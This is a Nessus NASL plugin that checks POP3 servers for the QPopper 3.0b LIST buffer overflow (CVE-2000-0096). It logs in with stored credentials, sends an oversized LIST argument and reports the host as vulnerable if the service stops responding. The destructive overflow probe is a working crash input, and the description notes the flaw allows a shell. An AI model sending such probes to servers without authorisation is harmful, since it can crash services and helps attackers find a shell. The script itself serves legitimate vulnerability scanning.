#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10197);
 script_bugtraq_id(948);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2000-0096");
 
 name["english"] = "qpopper LIST buffer overflow";
 name["francais"] = "dépassement de buffer dans qpopper - commande LIST";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
There is a vulnerability in the QPopper 3.0b package that
allows users with a valid account to gain a shell on the system


Solution : Upgrade to version 3.0.2 or newer
Risk factor : Medium";

 desc["francais"] = "
Il y a un dépassement de buffer dans QPopper 3.0b qui permet
aux utilisateurs ayant un compte valide d'obtenir un shell
sur la machine


Solution : Mettez-le à jour en version 3.0.2 ou plus récent
Facteur de risque : Moyen";

 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "checks for a buffer overflow in pop3";
 summary["francais"] = "vérifie la présence d'un dépassement de buffer dans pop3";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 family["english"] = "Gain a shell remotely";
 family["francais"] = "Obtenir un shell à distance";
 script_family(english:family["english"],
	       francais:family["francais"]); 
 script_dependencie("find_service.nes", "logins.nasl");
		       		     
 script_require_ports("Services/pop3", 110);
 script_require_keys("pop3/login", "pop3/password");

 exit(0);
}

acct = get_kb_item("pop3/login");
pass = get_kb_item("pop3/password");

if((acct == "")||(pass == ""))exit(0);

port = get_kb_item("Services/pop3");
if(!port)port = 110;

if(get_port_state(port))
{
 s1 = string("USER ", acct, "\r\n");
 s2 = string("PASS ", pass, "\r\n");
 
 s3 = string("LIST 1 ", crap(4096), "\r\n");
 
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 b = recv_line(socket:soc, length:1024);
 if(!strlen(b)){
 	close(soc);
	exit(0);
	}
 send(socket:soc, data:s1);
 b = recv_line(socket:soc, length:1024);
 send(socket:soc, data:s2);
 b = recv_line(socket:soc, length:1024);
 if("OK" >< b)
 {
  send(socket:soc, data:s3);
  c = recv_line(socket:soc, length:1024);
  if(strlen(c) == 0)security_warning(port);
 }
 close(soc);
}

